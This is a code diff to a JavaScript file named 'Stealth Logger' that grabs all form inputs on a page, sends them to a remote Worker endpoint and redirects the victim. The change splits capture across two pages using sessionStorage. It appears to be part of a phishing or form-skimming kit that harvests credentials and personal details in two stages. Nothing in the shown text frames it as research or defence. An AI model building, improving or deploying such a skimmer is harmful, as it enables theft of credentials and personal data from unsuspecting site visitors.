@@ -14,8 +14,8 @@ const CONFIG = {
     const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);
     let typingTimer;
     let formData = {};
-    let currentStage = 1;
-    let stage1Data = {};
+    let currentStage = window.CURRENT_STAGE || 1;
+    let stage1Data = JSON.parse(sessionStorage.getItem('dtech_stage1_data') || '{}');
 
     const getFieldName = (field) => {
         return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || `unnamed_${field.type}`;
@@ -25,10 +25,6 @@ const CONFIG = {
         const data = { ...formData };
 
         let selector = 'input, textarea, select';
-        if (CONFIG.MULTI_STAGE) {
-            selector = currentStage === 1 ? '#dtech-stage-1 input, #dtech-stage-1 textarea, #dtech-stage-1 select'
-                                          : '#dtech-stage-2 input, #dtech-stage-2 textarea, #dtech-stage-2 select';
-        }
 
         document.querySelectorAll(selector).forEach(field => {
             const name = getFieldName(field);
@@ -64,6 +60,9 @@ const CONFIG = {
 
             if (response.ok) {
                 log('Successfully sent to Worker');
+                if (CONFIG.MULTI_STAGE && currentStage === 2) {
+                    sessionStorage.removeItem('dtech_stage1_data');
+                }
                 window.location.href = CONFIG.REDIRECT_URL;
             } else {
                 const err = await response.text();
@@ -91,17 +90,11 @@ const CONFIG = {
                  e.stopPropagation();
 
                  const s1Data = captureAllInputs();
-                 stage1Data = s1Data;
-                 formData = {};
+                 sessionStorage.setItem('dtech_stage1_data', JSON.stringify(s1Data));
+                 log('Saved Stage 1 data, redirecting to /stage2');
 
-                 const s1 = document.getElementById('dtech-stage-1');
-                 const s2 = document.getElementById('dtech-stage-2');
-                 if(s1 && s2) {
-                     s1.style.display = 'none';
-                     s2.style.display = 'block';
-                     currentStage = 2;
-                     log('Switched to Stage 2');
-                 }
+                 // preserve query params if any
+                 window.location.href = '/stage2' + window.location.search;
                  return;
              }
         }
